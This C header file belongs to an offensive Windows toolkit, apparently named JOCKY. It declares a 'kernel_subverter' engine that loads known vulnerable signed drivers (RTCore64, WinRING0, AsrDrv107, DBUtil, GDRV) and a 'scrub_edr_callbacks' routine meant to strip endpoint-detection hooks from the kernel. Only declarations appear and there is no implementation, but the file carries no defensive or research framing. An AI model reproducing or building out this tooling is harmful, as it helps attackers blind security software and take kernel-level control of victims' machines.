/*
 * byovd.h -- JOCKY BYOVD subsystem: master header
 * byovd/kernel_subverter/byovd.h
 */
#pragma once
#include <windows.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "byovd_interface.h"

/* ── backend init declarations ───────────────────────────────────────── */
byovd_backend_t *rtcore64_backend_init  (const char *driver_path);
byovd_backend_t *winring0_backend_init  (const char *driver_path);
byovd_backend_t *asrdrv107_backend_init (const char *driver_path);

/* ── callback scrubber ───────────────────────────────────────────────── */
int scrub_edr_callbacks(byovd_backend_t *backend);

/* ── backend selector ────────────────────────────────────────────────── */
typedef enum {
    BYOVD_BACKEND_RTCORE64   = 0,
    BYOVD_BACKEND_DBUTIL     = 1,
    BYOVD_BACKEND_GDRV       = 2,
    BYOVD_BACKEND_WINRING0   = 3,
    BYOVD_BACKEND_ASRDRV107  = 4,
    BYOVD_BACKEND_AUTO       = 99,
} byovd_backend_id_t;

/* ── orchestrator API ────────────────────────────────────────────────── */
byovd_backend_t *byovd_engine_init   (byovd_backend_id_t id,
                                       const char        *driver_path);
int              byovd_engine_run    (byovd_backend_t *backend);
void             byovd_engine_cleanup(byovd_backend_t *backend);